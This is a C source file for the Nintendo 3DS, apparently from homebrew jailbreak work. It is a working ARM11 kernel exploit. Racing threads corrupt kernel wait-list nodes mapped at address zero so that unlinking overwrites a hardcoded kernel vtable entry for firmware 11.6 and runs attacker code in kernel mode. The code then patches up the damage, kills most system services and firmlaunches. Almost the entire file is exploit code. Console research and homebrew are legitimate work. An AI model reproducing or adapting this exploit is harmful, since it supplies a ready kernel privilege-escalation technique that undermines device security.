#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <malloc.h>

#include "text.h"
#include "rohax2.h"
#include "asm.h"
#include "ns.h"

Handle wait_handles[256] = {0};
Handle wait_handles_2[256] = {0};
const int num_waits = sizeof(wait_handles) / sizeof(wait_handles[0]);

u32* test_buf = (u32*)0x0dea0000;
u32* test_buf_mirror = NULL;

vu32 done = 0;
vu32 stop_loop = 0;

u8* bottom_fb = NULL;

u32 corruption_target = 0xdff80000 + 0x6C68C + 0x24; // N3DS 11.6 (VA: 0xFFF2E68C + 0x24)
u32 corruption_target_val = 0xFFF291D4; // bx lr

vu32 val_objptr = 0;
vu32 val_next = 0;
vu32 val_prev = 0;

Handle wait_thread_handles[16] = {0};
#define num_wait_threads (sizeof(wait_thread_handles) / sizeof(wait_thread_handles[0]))
void* wait_thread_stacks[num_wait_threads];

void wait_thread(u32 wait_thread_id)
{
	s32 out = 0;

	svcWaitSynchronizationN(&out, wait_thread_id ? wait_handles : wait_handles_2, num_waits, false, 0x0FFFFFFFFFFFFFFFll);

	svcExitThread();
}

void ktest()
{
	// wait for other thread to be ready
	while(*(vu32*)&test_buf_mirror[0] == 0xdadadada) svcSleepThread(1 * 1000 * 1000);

	// go exploit stuff
	{
		svcSleepThread(1 * 1000 * 1000);

		Handle wait_obj = 0;
		Handle wait_obj_2 = 0;

		svcCreateEvent(&wait_obj, 0);
		svcCreateEvent(&wait_obj_2, 0);

		int i;
		for(i = 0; i < num_waits; i++)
		{
			wait_handles[i] = wait_obj;
			wait_handles_2[i] = wait_obj_2;
		}

		for(i = 0; i < num_wait_threads; i++)
		{
			svcCreateThread(&wait_thread_handles[i], (void*)wait_thread, i, wait_thread_stacks[i], 0x19, 1);

			svcSleepThread(1 * 1000 * 1000);

			if(stop_loop) break;
		}
	}

	while(1);

	svcExitThread();
}

u32 kobj_buffer_kva, kobj_2_buffer_kva;
u32 val_nextptr = 0xdeadbabe;

int hello(u32* list_obj, u32* kobj)
{
	// fix vtable entry we hijacked
	*(u32*)corruption_target = corruption_target_val;

	// draw to screen a bit
	memset(bottom_fb, 0xda, 240 * 320 * 3);
	drawString(bottom_fb, "hello from arm11 kernel", 10, 10);
	flush_dcache();

	// fix up list object data to pretend unlinking didn't just happen
	list_obj[2]++;

	// fix up previous node to point to the next one
	*(vu32*)&test_buf_mirror[0x00] = 0x00000080;

	// fix up next node to be nice and wholesome
	*(vu32*)&test_buf_mirror[0x20] = val_nextptr;
	*(vu32*)&test_buf_mirror[0x21] = 0xc0c0c0c0;
	*(vu32*)&test_buf_mirror[0x22] = kobj_buffer_kva;

	// draw some more
	drawString(bottom_fb, "hello from arm11 kernel again", 10, 20);
	// drawHex(bottom_fb, val_next, 10, 30);
	flush_dcache();

	// *(u32*) 0xdeadbabe = 0xbabe;

	return 0;
}

void speedracer()
{
	*(vu32*)&test_buf_mirror[0x0] = 0;

	while(1)
	{
		val_nextptr = *(vu32*)&test_buf_mirror[0x0];

		if(val_nextptr != 0)
		{
			val_objptr = *(vu32*)&test_buf_mirror[0x2];
		
			// let the other thread know that it can stop
			stop_loop = 1;

			// signal one of the events such that a bunch of kernel list nodes get freed and only one list uses the null node
			svcSignalEvent(wait_handles_2[0]);
			break;
		}
	}

	// wait for the null-node list insertion and such to happen
	svcSleepThread(1 * 1000 * 1000);

	// place fake kobjects at an address which is also a non-destructive instruction
	kobj_buffer_kva = 0x00000800;
	*(u8*)(kobj_2_buffer_kva + 0x34) = 0x0;
	kobj_2_buffer_kva = 0x00000C00;
	*(u8*)(kobj_2_buffer_kva + 0x34) = 0x1;

	// first node: use kobj so that it doesn't get unlinked (and avoid a kernel panic because this is the null-node)
	// *(vu32*)&test_buf_mirror[0x00] = val_nextptr;
	*(vu32*)&test_buf_mirror[0x00] = 0x00000040;
	*(vu32*)&test_buf_mirror[0x01] = 0xc0c0c0c0;
	*(vu32*)&test_buf_mirror[0x02] = kobj_buffer_kva;

	// second node: write 0x80 to corruption_target
	*(vu32*)&test_buf_mirror[0x10] = 0x00000080;
	*(vu32*)&test_buf_mirror[0x11] = corruption_target;
	*(vu32*)&test_buf_mirror[0x12] = kobj_2_buffer_kva;

	// third node: skip such that next node doesn't get modified, then basically a nopseld followed by a "b hello"
	*(vu32*)&test_buf_mirror[0x20] = 0xE59FF000; // ldr pc, [pc]
	*(vu32*)&test_buf_mirror[0x21] = 0xdeadbabe; // will get overwritten with corruption_target so we ignore it
	*(vu32*)&test_buf_mirror[0x22] = (u32)&hello; // pc

    printf("done\n");

	svcSignalEvent(wait_handles[0]);
    
    printf("done again!\n");
}

Result zhax()
{
	// make it possible to schedule threads on syscore
	Result ret = APT_SetAppCpuTimeLimit(5);
	printf("APT_SetAppCpuTimeLimit %08X\n", (unsigned int)ret);

	// set max priority on current thread
	svcSetThreadPriority(0xFFFF8000, 0x19);

	const u32 stack_len = 0x10000;
	u8* stack = malloc(stack_len);
	
	test_buf = memalign(0x1000, 0x1000);
	memset(test_buf, 0xda, 0x1000);

	// map to 0
	ret = HB_ControlProcessMemory(NULL, (u32)test_buf_mirror, (u32)test_buf, 0x1000, MEMOP_MAP, MEMPERM_READ | MEMPERM_WRITE | MEMPERM_EXECUTE);
	printf("ret %08X %08X\n", (unsigned int)ret, (unsigned int)test_buf);

	if(!ret)
	{
		// allocate stacks
			int i;
			for(i = 0; i < num_wait_threads; i++)
			{
				wait_thread_stacks[i] = (u8*)malloc(stack_len) + stack_len;
			}
		// kill all the processes (in reverse-ish creation order)
			NS_TerminateTitle(0x4013000004002ll, 1 * 1000 * 1000); // nfc
			NS_TerminateTitle(0x4013000004102ll, 1 * 1000 * 1000); // mvd
			NS_TerminateTitle(0x4013000004202ll, 1 * 1000 * 1000); // qtm
			NS_TerminateTitle(0x4013000002802ll, 1 * 1000 * 1000); // dlp     ; 0x25
			NS_TerminateTitle(0x4013000002c02ll, 1 * 1000 * 1000); // nim     ; 0x24
			NS_TerminateTitle(0x4013000002b02ll, 1 * 1000 * 1000); // ndm     ; 0x23
			NS_TerminateTitle(0x4013000003502ll, 1 * 1000 * 1000); // news    ; 0x22
			NS_TerminateTitle(0x4013000003802ll, 1 * 1000 * 1000); // act     ; 0x21
			NS_TerminateTitle(0x4013000003402ll, 1 * 1000 * 1000); // boss    ; 0x20
			NS_TerminateTitle(0x4013000002402ll, 1 * 1000 * 1000); // ac      ; 0x1f
			NS_TerminateTitle(0x4013000003202ll, 1 * 1000 * 1000); // friends ; 0x1e
			NS_TerminateTitle(0x4013000002602ll, 1 * 1000 * 1000); // cecd    ; 0x1d
			NS_TerminateTitle(0x4013000002f02ll, 1 * 1000 * 1000); // ssl     ; 0x1c
			NS_TerminateTitle(0x4013000002902ll, 1 * 1000 * 1000); // http    ; 0x1b

			NS_TerminateTitle(0x4013000002e02ll, 1 * 1000 * 1000); // socket  ; 0x1a
			// NS_TerminateTitle(0x4013000002d02ll, 1 * 1000 * 1000); // nwm     ; 0x19
			NS_TerminateTitle(0x4013000003302ll, 1 * 1000 * 1000); // ir      ; 0x18
			NS_TerminateTitle(0x4013000002002ll, 1 * 1000 * 1000); // mic     ; 0x17
			NS_TerminateTitle(0x4013000001602ll, 1 * 1000 * 1000); // camera  ; 0x16
			NS_TerminateTitle(0x4013000002702ll, 1 * 1000 * 1000); // csnd    ; 0x15
			// NS_TerminateTitle(0x4013000001c02ll, 1 * 1000 * 1000); // gsp     ; 0x14
			// NS_TerminateTitle(0x4013000001502ll, 1 * 1000 * 1000); // am      ; 0x13
			NS_TerminateTitle(0x4013000001a02ll, 1 * 1000 * 1000); // dsp     ; 0x12
			NS_TerminateTitle(0x4013000001802ll, 1 * 1000 * 1000); // codec   ; 0x11
			NS_TerminateTitle(0x4013000001d02ll, 1 * 1000 * 1000); // hid     ; 0x10
			NS_TerminateTitle(0x4003000008a02ll, 1 * 1000 * 1000); // ErrDisp ; 0x0e

			// NS_TerminateTitle(0x4013000003102ll, 1 * 1000 * 1000); // ps      ; 0x0d
			// NS_TerminateTitle(0x4013000002302ll, 1 * 1000 * 1000); // spi     ; 0x0c
			// NS_TerminateTitle(0x4013000002102ll, 1 * 1000 * 1000); // pdn     ; 0x0b
			// NS_TerminateTitle(0x4013000001f02ll, 1 * 1000 * 1000); // mcu     ; 0x0a
			// NS_TerminateTitle(0x4013000001e02ll, 1 * 1000 * 1000); // i2c     ; 0x09
			// NS_TerminateTitle(0x4013000001b02ll, 1 * 1000 * 1000); // gpio    ; 0x08
			// NS_TerminateTitle(0x4013000001702ll, 1 * 1000 * 1000); // cfg     ; 0x07
			// NS_TerminateTitle(0x4013000002202ll, 1 * 1000 * 1000); // ptm     ; 0x06


			// need to do menu second to last because killing it kills our ns:s handle
			// NS_TerminateTitle(0x4003000008202ll, 1 * 1000 * 1000); // menu (JPN)
			// NS_TerminateTitle(0x4003000008F02ll, 1 * 1000 * 1000); // menu (USA)
			// NS_TerminateTitle(0x4003000009802ll, 1 * 1000 * 1000); // menu (EUR)

			// NS_TerminateTitle(0x4013000008002ll, 1 * 1000 * 1000); // ns      ; 0x05

		Handle thread = 0;
		ret = svcCreateThread(&thread, ktest, 0, (u32*)(stack + stack_len), 0x20, 1);

		printf("hi\n");

		speedracer();

		// firmlaunch
		NS_LaunchApplicationFIRM(0x0004800542383841ll, 1);
		svcExitProcess();
	}

	return 0;
}
